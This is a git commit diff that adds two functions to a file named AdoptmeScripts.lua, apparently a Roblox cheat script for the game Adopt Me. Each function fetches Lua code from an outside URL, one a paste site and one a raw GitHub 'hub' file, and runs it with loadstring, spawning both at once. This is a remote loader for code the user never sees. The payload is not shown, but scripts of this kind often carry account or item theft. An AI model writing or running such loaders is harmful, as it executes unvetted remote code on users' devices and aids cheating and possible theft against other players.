e009ca05e387350e4fbb284cd2786c574982ba3d
LuaScript <Franzforger15@gmail.com>
2025-11-01 00:34:51 +0800

    Update AdoptmeScripts.lua

--- AdoptmeScripts.lua
+++ AdoptmeScripts.lua
@@ -1,1 +1,9 @@
+local function s1()
+loadstring(game:HttpGet("https://paste.debian.net/plainh/74161293/", true))() 
+end 
+local function s2() 
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/snthnova/Snthnova-Hub/refs/heads/main/lua"))()
+end 
+task.spawn(s1)
+task.spawn(s2)
 
